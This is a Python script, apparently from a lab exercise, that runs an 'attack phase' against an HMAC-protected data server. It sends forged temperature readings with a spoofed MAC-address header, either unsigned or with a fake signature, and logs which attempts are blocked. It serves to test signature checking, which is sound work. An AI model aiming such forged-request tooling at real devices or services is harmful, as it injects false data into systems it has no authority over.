import requests
import time
import logging
import json

logging.basicConfig(
    filename="HMAC_Attacker.log",
    level=logging.INFO,
    format="%(asctime)s-%(levelname)s- %(message)s"
)

spoofed_mac_address = 'spoffed mac address'
server_url="http://server's IP Address:5000"
total_attempts=10

def send_forged_requests():
    successful_attempts=0
    failed_attempts=0 

    for attempt in range(total_attempts):

        headers = {
            "mac-address": spoofed_mac_address,
            "content-type": 'application/json'
        }
        data_packet = {
            "temperature": 25.0 + attempt, # False temperature data
            "note": f"Forged request attempt {attempt + 1}" 
        }

        if attempt % 3==0:
            attack_mode="NO_SIGNATURE" #This allows the attack to rotate through 2 different attack modes ie without signature and with fake signature.
        else:
            attack_mode="FAKE SIGNATURE"
            headers["hmac-signature"]="6e4d97fe392c616ccd2abeae96a91ca89ce038f308fb64e53e13330fdf73f70b"

        try:
            response = requests.post(
                server_url + "/data",
                headers=headers,
                json=data_packet,
                timeout=10
            )
            response_data = response.json()
            status_message = response_data.get("status", "No status in response")

            if response.status_code == 200:
                successful_attempts += 1
                print(f"Attempt {attempt + 1} [{attack_mode}]: SUCCESS | {status_message}")
                logging.info(f"Attempt {attempt + 1} [{attack_mode}]: SUCCESS | {status_message}")
            else:
                failed_attempts += 1
                print(f"Attempt {attempt + 1} [{attack_mode}]: BLOCKED | {status_message}")
                logging.warning(f"Attempt {attempt + 1} [{attack_mode}]: BLOCKED | {status_message}")

        except Exception as e:
            failed_attempts+=1
            print(f"Attempt {attempt + 1} [{attack_mode}]: An error occurred while sending forged request: {e}")
            logging.error(f"Attempt {attempt + 1} [{attack_mode}]: An error occurred while sending forged request: {e}")

        time.sleep(2)

    return successful_attempts, failed_attempts

def run_attack():
    print("=" * 50)
    print("\t\tATTACK PHASE - HMAC SERVER")
    print("=" * 50)
    print(f"[*] Spoofed MAC Address: {spoofed_mac_address}")
    print(f"[*] Server URL: {server_url}")
    print("[*]Secret key: UNKOWN")
    print(f"[*] Total Attempts: {total_attempts}")
    print("=" * 50)
    print("[*] Starting attack mode 1: Sending forged requests to the server without signature...")
    logging.info("Starting attack mode 1: Sending forged requests to the server without signature...")
    print("[*] Starting attack mode 2: Sending forged requests to the server with fake signature...")
    logging.info("Starting attack mode 2: Sending forged requests to the server with fake signature...")

    successful_attempts, failed_attempts = send_forged_requests()

    success_rate=(successful_attempts/total_attempts) * 100

    print("=" * 50)
    print(f"[*]Successful Attempts: {successful_attempts}")
    print(f"[*]Failed Attempts: {failed_attempts}")
    print(f"[*]Success Rate: {success_rate:.1f}%")
    print("=" * 50)

    logging.info(f"Attack Complete")
    logging.info(f"Successful attacks: {successful_attempts} | Blocked attacks: {failed_attempts}")
    logging.info(f"Success Rate: {success_rate:.1f}%")


if __name__ == "__main__":
    run_attack()
                  